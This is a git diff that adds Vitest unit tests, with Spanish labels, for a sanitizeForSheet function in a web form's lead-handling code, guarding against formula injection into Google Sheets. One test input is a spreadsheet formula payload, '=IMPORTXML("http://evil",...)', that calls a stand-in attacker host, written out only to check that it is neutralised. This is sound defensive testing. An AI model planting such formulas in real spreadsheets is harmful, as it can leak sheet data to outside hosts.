@@ -1,5 +1,5 @@
 import { describe, expect, test } from 'vitest';
-import { validateLead, buildWhatsAppUrl, desdeToProjectType } from './leads';
+import { validateLead, buildWhatsAppUrl, desdeToProjectType, sanitizeForSheet } from './leads';
 
 const base = {
   nombre: 'Ana Pérez',
@@ -88,5 +88,22 @@ describe('desdeToProjectType — pre-selección por sección de origen (§8)', (
     for (const d of ['hero', 'header', 'general', 'samuel', 'lo-que-sea']) {
       expect(desdeToProjectType(d)).toBeNull();
     }
+  });
+});
+
+describe('sanitizeForSheet — anti-inyección de fórmulas en Google Sheets', () => {
+  test('un valor que empieza por = + - @ (o tab/CR) se prefija con comilla → texto, no fórmula', () => {
+    expect(sanitizeForSheet('=IMPORTXML("http://evil","//x")')).toBe("'=IMPORTXML(\"http://evil\",\"//x\")");
+    expect(sanitizeForSheet('+1234')).toBe("'+1234");
+    expect(sanitizeForSheet('-5+cmd')).toBe("'-5+cmd");
+    expect(sanitizeForSheet('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
+    expect(sanitizeForSheet('\t=1')).toBe("'\t=1");
+  });
+
+  test('texto normal no se toca', () => {
+    expect(sanitizeForSheet('Ana Pérez')).toBe('Ana Pérez');
+    expect(sanitizeForSheet('Quiero un ERP a la medida')).toBe('Quiero un ERP a la medida');
+    expect(sanitizeForSheet('correo@dominio.com')).toBe('correo@dominio.com'); // @ solo peligra al INICIO
+    expect(sanitizeForSheet('')).toBe('');
   });
 });
